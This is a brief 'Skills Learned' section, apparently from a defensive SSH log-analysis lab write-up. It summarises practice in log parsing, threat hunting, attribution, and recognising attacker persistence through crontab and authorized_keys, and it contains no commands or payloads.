## Skills Learned

- 🧠 **Log Analysis**: Practiced parsing SSH logs to trace unauthorized access and user commands.
- 📌 **Threat Hunting**: Identified indicators of compromise like suspicious IPs, unauthorized file downloads, and persistence tactics.
- 🛠️ **Persistence Mechanisms**: Learned how attackers use `crontab` and `authorized_keys` to maintain access.
- 🧩 **Attribution**: Distinguished legitimate vs. malicious user actions based on command context and login sources.
